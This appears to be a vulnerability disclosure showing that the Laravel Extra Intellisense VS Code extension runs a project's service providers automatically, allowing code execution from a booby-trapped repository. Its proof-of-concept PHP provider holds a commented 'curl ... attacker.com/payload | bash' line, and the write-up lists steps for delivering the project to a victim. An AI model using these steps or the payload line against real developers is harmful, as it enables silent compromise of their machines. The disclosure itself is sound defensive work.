# Laravel Extra Intellisense Security Analysis

## Remote Code Execution via Malicious Laravel Service Provider

### Vulnerability Name
Remote Code Execution via Malicious Laravel Service Provider

### Description
This vulnerability allows a threat actor to execute arbitrary code on a user's system by creating a specially crafted Laravel project with malicious code in service providers, middleware, or other Laravel bootstrap components.

The VS Code extension automatically bootstraps the entire Laravel application to extract information like routes, views, models, etc. When a user opens a Laravel project containing malicious code, that code will be executed whenever the extension performs its analysis of the project structure, which happens periodically and automatically.

Steps to trigger the vulnerability:
1. Attacker creates a legitimate-looking Laravel project with a hidden malicious service provider
2. Target user opens the project in VS Code with Laravel Extra Intellisense extension enabled
3. The extension automatically bootstraps the Laravel application, loading all service providers
4. The malicious service provider's code executes with the permissions of the VS Code process

### Impact
The attacker can execute arbitrary code on the user's system with the privileges of the VS Code process. This could lead to:
- Data exfiltration
- Installation of malware
- Unauthorized access to local files
- Lateral movement within the user's system
- Potential persistence mechanisms through scheduled tasks or other means

### Vulnerability Rank
High - While it requires the user to open a malicious project, the impact is severe (arbitrary code execution) and the execution happens automatically without user interaction once the project is opened.

### Currently Implemented Mitigations
The extension includes a security warning in the README that acknowledges this risk:

> "This extension runs your Laravel application automatically and periodically to get the information needed to provide autocomplete. [...] Also if you writing any sensitive code in your service providers, disable the extension temporarily to prevent unwanted application executing."

### Missing Mitigations
- No sandboxing or privilege restriction when executing PHP code
- No user prompt before analyzing unfamiliar projects
- No code scanning to detect potentially malicious service providers
- No option to disable automatic execution and require manual triggering of analysis
- No limitation on what Laravel components are loaded during bootstrap

### Preconditions
- User must open a Laravel project containing malicious code in VS Code
- The Laravel Extra Intellisense extension must be enabled
- The user must have PHP installed and accessible from the command line

### Source Code Analysis
The vulnerability originates in the `runLaravel` method in `helpers.ts`, which bootstraps the Laravel application:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
            "class VscodeLaravelExtraIntellisenseProvider extends \\Illuminate\\Support\\ServiceProvider" +
            "{" +
            "   public function register() {}" +
            "	public function boot()" +
            "	{" +
            "       if (method_exists($this->app['log'], 'setHandlers')) {" +
            "			$this->app['log']->setHandlers([new \\Monolog\\Handler\\ProcessHandler()]);" +
            "		}" +
            "	}" +
            "}" +
            "$app->register(new VscodeLaravelExtraIntellisenseProvider($app));" +
            "$kernel = $app->make(Illuminate\\Contracts\\Console\\Kernel::class);" +
            // ...execution continues
```

This code loads the Laravel application's autoloader and bootstrap file, which in turn loads all registered service providers. If a malicious service provider exists, it will be executed during this process.

The extension calls this method frequently. For example, in `RouteProvider.ts`:

```typescript
loadRoutes() {
    if (vscode.workspace.workspaceFolders instanceof Array && vscode.workspace.workspaceFolders.length > 0) {
        try {
            var self = this;
            Helpers.runLaravel(
                "echo json_encode(array_map(function ($route) {" +
                // ... processing code ...
                "}, app('router')->getRoutes()->getRoutes()));",
                "HTTP Routes"
            )
            // ...
        }
    }
}
```

Similar code exists in multiple provider classes, and they are all triggered automatically when the extension activates or when files change.

### Security Test Case
To demonstrate this vulnerability:

1. Create a malicious Laravel service provider:
   ```php
   <?php
   namespace App\Providers;

   use Illuminate\Support\ServiceProvider;

   class MaliciousProvider extends ServiceProvider
   {
       public function register()
       {
           // Create a file as proof of execution
           file_put_contents('/tmp/vscode_rce_proof.txt', 'Code execution successful at ' . date('Y-m-d H:i:s'));

           // A real attacker might use more dangerous code like:
           // shell_exec('curl -s https://attacker.com/payload | bash');
       }
   }
   ```

2. Register the provider in `config/app.php`:
   ```php
   'providers' => [
       // Standard Laravel providers...
       App\Providers\MaliciousProvider::class,
   ],
   ```

3. Send the project to the victim (e.g., as a GitHub repository, pull request, or downloaded template)

4. When the victim opens the project in VS Code with Laravel Extra Intellisense installed, the malicious code will execute automatically

5. Verify that `/tmp/vscode_rce_proof.txt` has been created, confirming successful code execution

This vulnerability is particularly dangerous because the code execution happens silently in the background without any indication to the user, and it will continue to be triggered periodically as the extension updates its cache of Laravel structures.
